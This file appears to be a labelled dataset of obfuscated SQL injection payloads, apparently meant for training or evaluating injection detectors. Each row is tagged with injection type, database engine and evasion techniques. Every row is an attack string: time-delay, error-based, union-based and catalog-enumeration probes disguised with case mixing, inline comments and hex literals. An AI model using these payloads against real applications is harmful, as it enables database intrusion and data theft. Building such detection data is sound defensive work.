payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"0b5X0x4x3O0""\ANd (seLEcT 9B0b2B6o0O9B0b0x24De){= <:(@\sELEcT COUNt ;(: *[@)@ from/DoMaIn.DOMAiNs aS T3x6,doMAiN.cOluMns aS T7,dOMaiN.TaBLEs%aS{t0b96~ )~ aNd)""ouIx"")]liKE ""ouIX",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"sEleCt CounT ( * ) FrOm genERaTe_seriEs/ ( (SELECT 1),(SeLecT 5040000) ) And 'rocA' likE 'ROcA",unknown,postgresql,case_variation|function_alternative,0.06,rule,sqliv5_json,unknown
"0X0x8' & ) ` ) )( rLIKE SLEep (( 0x5 ) /*b*`*/ OR+ -(SElecT 0b111) && TRUE/*fM|ODfO*/or 0B111X0b4o10216405305 lIKe (SEleCt 2051) Or false* Or (SELECT 4014)<>(selECT (SeLect 0o0x113E)) aNd]TrUe.aNd 'a ' nOt LIke 'a E' aND ""804<>805 ; && ; <'bR'<>'bRr' and 7598 Not LIKE=(SeLECT (SeLect (sElECt (SElecT 0X1dAD)))) aND tRuE#6g>%_]0O6dgC@^;",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.05,rule,sqliv5_json,unknown
"1' WhERE (sELECt 3900) Like (seLeCt 0X0Xf0O1B11c)/ aND (SeLect 0b0O7203) IN: ( ( ~ ChAr ( 0o3O6o245 ) +Char/*G{.;EF&l)*/]( (sELEcT 0x11) ) ~+chAr ( 0x50 ])} +cHAR !(< (seLEct 103) ) +ChaR ( (sELECT 113); ) [+ (/*Px?imOCb*/ SelEcT '( cAsE WhEN ( (selECt (seLEct (SElEcT 3315))) LIKe (selEcT 3715)( ) then+cHar ( (SELECT 49) ) eLSE CHAr ( 0x0X0x0b1E ) End ) ) +ChAR '(/ (sELEct (selECT 813)) ) +CHaR, ( /122 ) +chAR ( (SELEct 118); ) +char ( 0X7A ) +CHAR ( (SElecT (SeLECt 173)) ) ) ) or (sElECt (seLeCT (sEleCT 0))) or FalSe/oR (sELect (SELEcT 805))<>805&&(seLECt 7714) nOt like 0x1bCb Or FAlSe{&& ""L"" NoT like ""LC"" Or 0 and$""d*z""<>""D*z5"" oR 0 or 0 oR (SELeCT 0) oR (SeleCT 0) OR ""BNTgW"" NOT like ""BntGW"" or FALse and TruEANDTRUe OR falSe OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"4'/* K&ekeXMjf)\J?.@vB0O8O7 hdQn9:] StOCkc`TnZ*/[ ) )@ rlIKE '(+{SeLEct * from :+(` sElECt ( SlEep\ (>](SeleCt 3x3x1O0o5), ,)< ) ` ) +Sgvo =) anD ( ; (! 'peMJ' ` LIKE / 'Pemj",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0X9' ) ); OR:0B6x0O2o1x0B1001100001b =[ }( ]seLeCT\Count ( ;* ) ~FrOm SySIbM.syStablES%As t8b0B7B100001100100101001111O3O0,sYSIBM.SystABlEs AS t0b0X0O4o0b10011105B1000,sYsibm.sYstaBles as{t8 )&+ < aND >` ]( &( 'aGSi' ; /*p<*/LikE 'agsi",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"4%' oR|(SeLeCt 0o0o13x0B0X0O0o5Df)! LIkE :^_(/ sELECt CoUnT ( ]*{ ) FROm/*s06k}Ozzm\ @ */Rdb$FIeLDS@aS t3B1,rdb$TYPES As T4,rdb$cOlLATioNS As t0O5,RDB$FUnCTiONs?as/*/CQiG +eMCd*/t4$ )~ oR 6B0x6 And (sELECT (SeLeCT 1))! AND ""s*;0o10"" Not like ""S*;(SelEcT (SELECT 8))]"" or fAlse , AnD ( (selecT (SELECT (SELECT 6))) aND (SELecT (seLect (seleCT 0x1F0x0))) NOt=0x1e4 AnD truE ANd(tRue AnD (SELECT (SELECT 1)) or ""r""=""R_"" --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"2' )[! oR`0b0X0B0B0x0X0b15x0O0o31Ab [=LIKe ""(; SElEct cOuNT?+( *_ )%:@frOm/DOMAIn.doMAinS\As;T0x0O3,dOmaIN.cOlumNs As t0o0o2O2b20,doMAIN.tABles As/*RefuwGc1B*/t4 );",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"1 ) AND cHar ( (selECt 120) ) ||chaR ( \106 ) ||CHAr ( =(SELECT 117) ) or chAR/**/ ( 0x55 ) LIkE reGEXP_SUbstRiNG ( rEpeaT ( RIght ( CHar ( (SeLECT 9931) ?) ,0 )/**/ ,(sElEcT 9b0b10011101111011100111100111011000100110110111011011100001011101110001110100111111101000110000011101000000000): ) /**/,NUll{ )",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"1' )* +As)tAaY wHeRE (SeleCT (SELEct 0X3b73))=0x2Eb anD eLt ( `0o2b0x0X6X44b =~(sElecT (seleCt (sElECt (SElect (sElEct (sELECt 2246)))))),0x1C3b `) AnD ' ' NOT LIKE ' j' oR 'c' Not =%'c' aND 0x1{ANd (SelECT 1)!anD=(SeLEct (SeLECt 0X1)) ANd "") L"" NOT LIke "") lL""~oR fAlSE anD TruE or FaLSe And TRue OR False --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1' WhERe/*6ZAJ*/(SElEct (selECt (seLEcT (SeLECT 0B0x706)))) =\ 0x403 oR cHAR ( (seLeCT 0x0o2X0B0xaC)<%)= Or CHar ( 0X55 ) or cHar ( (SElECT (seLeCT (SeLeCt (SeLeCt (SElect (seLecT (SelECT 67))))))) ) { OR cHaR/*dS1(Y>.x`zZ3Of&AML?*/ (+ 0o0X0B110111 ) . LikE < RegExP_SuBStriNg ( REpEat (; rIGHT%_( CHAR ( 0x15D5 )[ ,0O8x0B0O0o0O3 ) "",0B1x17A95f32C ) ,nULL ); and +(select (SELECT 0x0b1C0o62)) nOT Like (SeLECT 0b0x1c36): Or 'X'.lIkE 'x`' aNd ANd truE aND (sElECT (SeLeCT 0o1)) or FalsE or (SEleCt (Select (SELECT (SELECT 1)))) or ':H'=':ho' Or 0 aNd TRuE@OR False&&(SELECT 1)#""`"" nOT Like ""`."" OR "" "":noT LIke "" "" OR ?(sELEct 0x966) NOt LikE ]0x966 --I7O7^m W})Bl#T[Oj",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"seleCT)COUnt /*j-^ And ""<f"" nOT.LiKE ?""<FB"" Or (sELEcT 0x0x0x0)-"" Or faLSE*&& ""Ph0"" +Not lIKe ""pH4V""`AnD 0xB in ((sEleCt (seleCt@0xa)),(sELecT (SelECT (sELeCt (SeLecT (sELEcT (SeLECt (SELecT 11))))))),0o0X0o0xC) OR faLsE#<0X0b0X3e8iv<]_E4k0Mf)*/( *,<) fRoM<SYsiBm.sYstAbLES*as T8,sYSibM.sysTAbLes%As T6b3b7X8X0O3,SYsIbM.sySTableS aS T3 And`""%"" )LikE ""Xt}bvQra",unknown,unknown,case_variation|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,in_clause
"0O0B1'/*Ob5Z_*/In BooLEAN modE );^ AnD elt ( (SeLecT 0xfd1) likE (SElEct)0B1000010011001),1B0b1110100011010101001111011010011010001011 )/*pU0b11(fOoswI9H|h 4CJ5*/ Or 0x0 aNd}5_And tRuE And '0O0b0qr'!='0qRc' or falSe AND 'Ib;y' LIKE 'Ib;y' AND (SELECT 1)#pGG",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"3"" ) ) ) ^ AnD (seLEct (SeleCT (selECt (SELEct 0xcA9)))) liKE COnvERT ( INt, ( SELecT CHaR ( (SELEct (SeLECt{(SelECT 113))) ) ~+ChAr| ( (sELEct 0X71) ) +Char ( (seleCt (sEleCT 2x40)) ) +CHar ( (seLEcT 0X6A) ) +cHAR< ( 0b0o0b0B0o0X3Ed201 ) + OR faLse# ( sELECt ( CASE WHeN ( (SElEct (sElecT 0x2031)) LIke (selECt 0o10221) ) thEn ChAR ( 0x31 ) else cHAr@ ( (seLeCT 48) ) END ) ) |+ChAr ( (selECT 0Xa0x3b14)> ) +cHAr ( (select (SElECT 132)) +)( +cHAR +( (sElEct 2x76)] ) +cHAr ( '(SELecT 0x7a) )} +chaR ( (seLECT 113): ) ) ) aND ( *( \( ""eoaB"" like ""eoABM&",error_based,mssql,case_variation|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"3' )/ WhEre`0X0XA0e. = (seLeCT 0x1Dde) aNd=(sElECT 0XdFC) =': (@ selEct COuNt;?(`?*"" ) From DoMAIN.doMainS:AS T4o0o9,DoMaiN.ColUMns/As t6,DomaiN.Tables AS T5 :) Or ""ho^"" like ""Ho^*"" AnD/0x06ce nOT LiKE\(SeLECT 0O11303) ANd True or (SELecT:(SElEct 0X18C3)) nOT like (SelEct 0x1O12C3) or (select 0X0)-aNd "" G"" noT LIkE "" Gz"" or faLSe OR FalSE aND TrUE OR False --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
9'<oR /*(seLEcT (SELect (seLEct (SELECT 2)))))e;Y;*/( seLEct * FRom ( SeLeCT ( sLEep}]( 2x0B0O0x0x6 +) ) *) yDPU ) ANd 'EJdk'.Like 'EJdK,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0o1"" aNd ExTraCtVaLUE ( (SELEct)(sELecT (seLEct/*:K9*/(selECT 8X6f2e)))),ConCaT ( 0o0x0O0B2o5c,8X5171703a0x4e, ( SeLeCt !( ELt (/*q]OA?(Select (SELECT (SELECT 2))) ,*/ 0b5X1f0E lIkE - 0X1f2E,0X1 +) ` ) ) ;,0X0b1041001107A767a71 )- _) AnD \Or FaLse OR +(sElECt 0x0) &&+ True oR FaLSE\Or faLSE oR falSe anD ""M+P""<>""m+pk""#""OkpA"" Like ""OkPa$ o{{:",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,string_double_quote
"0O6 }) ) ) oR elt ( }6o0O0x0o9X6f5B2 liKe 0o10x3xF7b18130,sLeep ( <1X0X6 ) ^) OR {fAlsE ANd/*oEjuq3)ZsI$kO 6Co*/tRUE oR*""@"" Not Like ""@"" aNd (SeLeCt 0X7x3) oR fALSe And~TRUe or (SElEct (SeLEct (seLEcT (SEleCT\(SELECT 0))))) oR (Select (SELECT 0))[aND TRUe && 1 OR 0#;iU`fGiy",unknown,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.05,rule,sqliv5_json,numeric
"CalL;REgeXp_SUbstRING ( REPeAT ( RIGhT ( CHaR; ( (SelecT (SElect}0xf43)) /**/) ,2x0? ) ,0X9DcD651e ) ,nULl ) && > ( 'aHJO'='AHjo",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0B0O1 WheRe 'T'<>'T6' or CHAR+ ( (SElEct (sElEct 0b1110101)) ) ,||cHaR (/ (sElECt 0X8x6F)? ) Or'ChaR ( (SELecT (sElecT (SelEcT (SELEct (SElEcT (SeLect (SELECt (SeLECT (SELECT 105)))))))))} ) ||cHAR ( 0x6e ) `= regExP_SUbSTrINg@?( RepeAt +( left ( crYpT_KeY *(( ChaR ( 0X0X0B0x18ceb^ ) ||ChAr ( 0o105 `)"" ||CHAR ( 0B0X0x0o65 |) ,NULl ) ,0B10 ) >,(seLeCT 0x1dcd6500) ) ,nULL ) Or (SelecT (sELEct 124)) <>`0B0x0X192 && (seleCt 2X53e)<>0x53f &&; TRUe oR fALSe~AnD ""S"" = ""s"" OR FaLse Or falSe && trUE ANd (SELECT 1) Or faLSE or faLsE --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1'/**/? && EXtRactvAlue~ (/ 0b0o1x1f2e,concAT (/{0x0b101c,0B0x0B0b10010101001110100001010101111001111110011100111111011011100011110110010011A0B0B11110900001111011011, (/*jU!.*/ seLECt ("" ElT ;( 0o17458 = 0b0B0X64x1f2e,(seLect (SeLeCT 0b0X0b111)) ) ]~ ) &&! tRuE && (SeLeCT 1886)!=(sELEcT 1884)#) ,0x7X017A775A0O107 ) ) \&& = 'CIPK',LikE 'cIpKz|K'w",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"seLECt (/**/ Case WHen -( 0o22603/*dA?m1*/ LIKe (sElECt (SelEcT 5x81DF)) )!?}ThEn 0X1 eLsE (SelEcT (selecT 9040))* ( SELecT (SELECT 0o22623)%FrOM maSTEr..SYSDAtabASEs ) end ) AnD ""l"">nOT?lIke ""l>"" && ""]rK<F"" nOT=""]Rk<FB"" OR (SELECT (SELECT 0)) AND True --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"SeLect ( CasE wHEn{""+( 0X14Aa LIKE (SELECT 4720) <) tHEN (seLECT 0O12252) Else 0X1/ ( selEcT (SeLECT (selECT (SELECT 2))) ) EnD ) OR ""@J^"" nOT LiKe ""@J^"" OR FAlsE Or fAlsE --",unknown,unknown,case_variation|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"2%"" + ) ) && (SELECT (SeleCT (seLeCt (sELecT (sELECT (SELECT 8417)))))) = ( SEleCt cOUnt ( * ){\ FrOm gENerAte_sERIES[ ( 0x1,0X7c4B1B0o301518 ) ) ? AnD ""(. ( ""%"" liKe """,unknown,postgresql,case_variation|function_alternative,0.06,rule,sqliv5_json,unknown
"[*(+ sELEct *;fROM %(; sElEcT ( sleEP ( (SELecT 9X0X3O0o2o0x5)> ) ~) } ) ;sRmQ ) && ( ""AVyw"" +Like ""Avyw",unknown,mysql,case_variation|function_alternative,0.05,rule,sqliv5_json,unknown
"1' )! ) AS OMwk WhERe (sELect (SELECT 1414)) =/ (sELeCT (SElEcT 1414)),aNd chAR ( 0b0B1111000` ) Or;ChaR: ( (sEleCT 0x0X0A) ~)& ;Or char` ( 1xD9| ) Or:chAr ;( (sELECt 0B110301). ) lIKE RegExp_SuBSTrInG%.( REPeat ( riGHT/<( cHAR+ ( (sElecT 0x270B) ) ,0X0b101 ) ,0X0o0xeA05f200 ) ,nUlL ) anD}(SelecT 0O0O0x0x1) oR falSE OR faLSe OR FalsE and (sElECT (SELECT 1)) ANd (sEleCT (SelEcT 8355))=0o0O37423 oR ""l'R"" liKE ""l'rF"" Or FALSe and ""`{n"" NoT LIkE ""`{N5"" ANd tRue AnD`';Q' noT liKE ';Qx' OR FaLse Or (SELEcT 0) aND TrUE aNd (SELEcT 0x5) or faLSe Or 0 Or False OR False --",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,string_single_quote
"2x0O0x0b0X6' ) ) AS WkYs wHERE (SElEct 0X9AE) =\(sElECT 5x9Ae) AnD^0o0X17a0b111 like CtxSyS.dRiThsx.SN [( (sELECt>(sEleCt 0x0o13643)), ( cHR ( (sElect (SElECt 0x71))/*s+j*QJN mJ*/ ) ||CHr/ ( (SEleCt (seLeCt 0X67)) ;) ||chR ( 3X50 ) ||chr ( (sELect 0X6A) )^[ OR CHR (^ 4X51 ) or ( ( SEleCT ( case wHeN% ( (selEcT (seleCt (sElect (SElect 0x422)))) liKe [3O89247 ) ThEN (SElecT 0O2) ELse 0x0 eNd ) FroM dUAL ) OR chr (~ 2O168 ) ||ChR ( (sELect 0b0X88)^ ) ||chr (. (SELECt (seLeCT (SeLeCT 18))) ) OR ChR ( 5X7A ) ||chr ( (SElect (SeLECt (sElECT (SELECT (SELECT 113))))) ) )~ ) OR FALSE aNd (sElEcT (SELEcT (SelEct (SELECT 0x1)))) ANd TRue or ""|I p"" NOT LIkE ""|I p"" Or FAlsE^ /**/ AND TRUE ANd TrUE AnD?TrUE oR fAlsE oR "" 9"" nOT likE "" 7"" or FAlSE or FaLsE anD@tRue Or false or (SELECT 0) AnD tRUe --",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.51,rule,sqliv5_json,unknown
"0B0o0X1'{Or ^,(% SElEct 'Qwoo' FRom duaL WherE}9X0b130011010110 lIke{0X2262-Or%ELt^ ( (seleCt (SELEct 0X0x1180)) `LiKe )0X1948,sLeEP ^( <(SelEct 0B0X0) ];)\ ) aNd tRue && tRUe oR FaLSe AND (sElect (SELect (seLecT (SELect 6415))))!=(sELeCt (sELect 6216)) OR/'*' NOT lIkE '*';OR (select 0X5) Or fAlSE AnD ""o"" noT LIke ""O>""# ? ) ; oR 'DqX;@",unknown,oracle,case_variation|function_alternative|hex_string,0.06,rule,sqliv5_json,string_double_quote
"8"" ); [) [ OR (seLECt (selEcT;8o0B2xd5E))=) (+ SELECT cOunT ( n`]y%* ) FrOM aLL_USerS t8x1,ALl_USers T5x0B0o0o0XA,All_UsErs t3,All_uSerS T0o10,aLl_UsERS^t8 ;) / aND /**/'S' not; like 'sL'] OR FAlSE AnD (SELecT (Select 0X85C))_in ((SelEcT 0x85d),(sELecT 0O0X85E),(SelecT`(selECt?4X85F)))>&& 0X1[--",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"0O0b110"" ) aS_lkzz where 8B110111601104& Like 6O0B1101001101013 And CHaR ( 0X0O0b1110100 ). or cHar ( (sELECt (SELEcT 0x6A)) ^) *Or cHar ( `(SELeCt (SeLEct 0o761)) ) oR CHaR ( 0x0b0O0o103\ ) \= RegeXP_suBstRIng< ( REpEAt//*\) fvA_T%&7g @C D(P*/( riGhT ( CHaR ( 0B0x0X0B0B10011011980101) ) ,(SelECT 0X3) ) !,0x12a068E0B0B101050 ){ ,NUlL ) :Or (SElECt 0Xb26) not in ((seleCT 2X16DE),(SELeCt (sELeCt (SeLEct (SElECt 0x16Df)))),(SELeCT((SeLect 0x16E0))) aND''{jS' NOT LIKE '{JSx' oR FALsE? Or: (selecT (sEleCT (SElEct (seLeCT (seLect 0X13F0))))) liKe 9X7441? oR (sEleCt 0x0) Or 0X0 or FaLse || FALSE OR (SeLEct (selEcT 0X0)) AND tRUe ANd tRuE And (SeLEcT (SELECT 1)) oR fALsE aNd ""Dey?""=""DEY?"" OR False --",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"1`* ) ) _As YFVg WheRe 0x1c6 LIkE 0B0X676 aNd roW, (/ 0o10110,0O16455 ) > (/ SELecT coUnt \( (* ) ,cOncat ;( 0x0B0x3161704A71, ( 'SElEcT (\ ELt ( 8X185D=0o0b0b0x1D6329F1c38083481297fD5023B14E66dD,(SElECt (SELeCt (selEct&(SElECT 0x1)))) })* ) . )^ ,0X717A767A0o7o101,flo oR ( r aND : ( (sElECt (SElecT 0)) ) *0B0xa ) ) X FroM ^( sELeCT 0B1010991001000 union SELeCT*(sELeCt (SELECt (SElect 3782)));UnIOn seLEcT 0xf0o5B/uNion!sElECt 0X1Bf6 ) a GrouP BY X} ) OR (SELEcT;(SeLEcT (SELEct (SELECT (SELECT 0))))) oR fAlsE:or "")"" like "")I"" AnD truE]oR ""lW6L"" NOT LiKe ""LW6l""&oR 0x0B0X1486 not lIKe 0x1474 oR FAlsE Or fALsE OR fALse or FaLSE or ;(SELeCt (SELECT 0)) oR 0x116C<>(SELecT 0X116c) or falsEandtRUe aND tRue --",union_based,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,unknown
"9o1o8'"" ) ) ? OR ;(/*Qpic;g""b*cuUWW?}eVZ*WL */`SeLeCt * FroM', (> select !( sLEep! (? (SeLeCT 0B0o7o0o6B105) ) ) \ ) ydpU )AND ( ! ( * 'CkMm' lIke 'CkMm",unknown,unknown,case_variation|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"1' ) Or roW ( 0X279D,(SelEcT (SElECt 0X1D6C)) ) > ( SElECT count +( * ) ,conCAt (* 0b0x7191776a71, _( seLect ( eLT. ( 0x416 likE (SelecT 7x418),0b7O6 ) ) ) ,0X2x0b10cDa267a71,FLOor ( RAnD ( (SeLecT (sELECt 0X0)) ) *0O0X0X0O2 ){ $ ) {x FROm ( SEleCt (SELEct 8488) UnIOn sElEct.4584 UNIOn SeLeCt (select 0xbEB) UniON SELECT (SelECT (SelEct""(seLeCT (SELECT (SELECT (SELECT 210)))))) )` A gRoUP By X )aND( 'ZypA' like 'ZYpA",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"0b1' ) whErE 0o32043 :== 0O0X0X1AdF ( seLeCT ( caSe WHeN ( 0X11EB LIke (seLecT 0b0b0b1110103011100001001110102011010101011001) `)* ThEN regExP_SUBStRiNg ( REpEAt ($ LEfT. ( CryPt_KEY .( ChaR ( 0o0X0b0X0O0b110011`\)/ } OR 0o2076{NOT LIKe 0x0b0b110100111011011110110101000 Or FALse oR faLse or falSE and '*;' NOt likE '*;m' or-0X1f8e nOT in ((SelECT (seLEcT 0X0x0X1F8d)),(sELECt](seLeCT 0X1F8E)),0X1F8f) oR]FaLsE or FaLSe OR (SElEcT (SelECT (SelECt (sElect (seLeCT""(SelEcT (sElecT (sELEcT (SELEcT (selECT (SELECT 0))))))))))) aNd TRUe aND#(SElecT (SeLECT 1)) aND tRUE Or FaLSe oR fAlsE or FaLse oR (sEleCt 0) OR FALSe aND (sElECT (SElEcT 1)) And tRUE && (SELECT 1719)=(SeLeCt (seLect 1719)) ANd 1#Or/CHAR .(+}0x48 ) oR CHar ("" 0xD )) ,NULl )/ ,(SELecT (seLect/(seLECt 0X0))) ;) ,0b0B2b0O0b13101110200711111100011120800 ) ,NUlL )& ELSE cHaR/*&1_`|:v0X6T.l~(SeLect (sEleCT 0X8))rv:&J;Z=*/ (/*(~m^*aj/O<Zx*/ 0o0x0x0X0b0O150c ) oR ChAR\ (')(SEleCT (SeLEct 0X0o0B110011)) )$,`|| chAr \( <0B0b1100110 ) oR ChAR`%( 0b1001700 ) ENd () !FrOm ( [vaLuES &( {0x4 )@ ~) & ) Or#""s"" NoT <lIKE ""s"" ANd }0x1<OR;FalSE\AnD*(SeleCT-(sELeCt.(SELEct (SElEct 0XB9b))))(Not liKe 0b0B0b5011110005010101000300101010011011100 --V(etm ;nB;);d,d",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,in_clause
"1' ~ )"" `) * as ICiK wheRe=0x2O5A9x0 *lIke (sElecT (SELEct (sEleCT (SeLeCt 1315)))) && (sELECt (SeLEcT 0x1fdf))= ( ]selEcT COUNT (; *( ) fRoM SysibM.systaBLeS AS t0b0X1,SYSiBM.sYSTabLEs|as t0B10,SYsibm.SYStablEs as t3 ) AnD \'rmN' NOT LIkE 'rmN-'{ or& 0X0X9O0`% Or /**/fAlSE && (SeLECt 0B1) Or 0xB36 NOt LikE 0b101109100816 And TRuE And}tRue ANd (SeLecT (sEleCT 2130)) NOT LIke (SELect (SeleCT (sElECt (SelEct (SELecT (seLeCT (SELECT (SELECT 2131)))))))) aNd tRuE aND 0b0O1 Or fAlSE/ANd ""U "" nOt lIKE ""U g""/**/--",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"SeLect BENCHmARK ~(=((sELecT;8x4c5b40),md5 >( 0O0o51x0o4C4d0o13776 ;;)?/*l5l `EQ\*/ ]) And 'nLrK',liKE 'nLRK",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"call|ReGExP_sUbsTRIng ( ~RePeAt ( LEFt (?/*;*/CRyPt_Key ( CHaR ( 7X0b0b1011O51] )? 'or chAr /( 0X0O3b0B0O12x41}`) or] Char;_( 9b0b1015291@ )$?,NULL`/) |,(sELecT (sELEcT^(SElect (SEleCT 0B11x0o11x6O0)))) ,) ',(selECt@6B0X23dE9f7fE0O357E440ceFBAcD0)] ) {,NUll ) )+ +'",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0B1'(^) WHErE 0X1A74^= (sELECt 0X0B1A74) ANd row ( 0x3X185D,(sElecT 0o86455) ) > ( seLEct coUNt ( * ) ,cONcAt *( 0x7171706a0o107, (!?SELeCt ( eLt |(^ 0X0o271d = 7X185d,(SelEcT (SELECT 1)) ) ) /**/~ ) ,6x712A0x2fda79,flOor ]( rANd :( (SeLECT (seLECT (seLeCt 7X2))) ) *(sELect (SElECT (sElECT (SELECT 2)))) \ ) ) x FrOm =( `selecT (SElECt((sELeCt (SeLeCt 0X1402))) UNION SELEct 0xec0o0B1001 uNION SeLECT (sElEct (SELecT 0XF5b)) UnIon SElect (sElect 0x1C0A) ) a grOup'BY X ) OR:""]a=~"" lIke ""]a=~&""= OR ?""/Q""=noT ,_likE ""/Q"" Or fALse Or (sELeCT (sELEct (SELECT 0))) aND '4' NOt LiKe '0B100L' AnD tRUE AnD tRue)AND true oR FaLSE oR[ ',' not LiKE ',' AnD TrUe && _ (SELECt 8579)=0X2183 aND TRuE or FALsE OR FaLSe anD TRUE or'falsE or FALSe --",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"sELEct dbMS_PIPe.ReCeIvE_mEssAge ( cHr !( (SELEcT (SELect 3x3X4c)) ) ` OR [CHr; ( 6o2X43 ) or chr ""( 0X5B40f |) or CHr ( (sELECT 0xa6) ) ,2X5 ) FroM dUAl aND (} 'QOmF'/*;{(SelECT 8):gWL*/LikE 'qoMf",time_blind,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.51,rule,sqliv5_json,unknown
"SELEct\Count =(@ *[');`~FrOm dOmain.DOmaINs`As T4X0b0x0o5x0b0x6o0o0,DomAIn.cOLUmnS As t0O5,DOmAIn.taBLEs As\t0X0b0O0x0x0X0x5b0B0o1x0o0o2< ; && -@\_ ~ (+*)*(. +[)(+ 'CTbS'=LIkE 'CTBs",unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"cAlL regExp_SuBSTriNG ( REpEat ( left :( CrYPT_Key ( 'cHaR ( (SELECt (sELeCT 0x0X0X0o51)) ) Or ChaR (, 0O0X0O116 ) OR CHar ( (seleCt/*er */(SeLect (sElECt (sEleCT (selecT (sELEcT 25)))))) ) "",NUll ) ,0X5 ) ,0X267fbFC5 ) ,null ) %aND ^ ( ' ( ]. ( ""lzyL""[lIkE ""LzYL",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
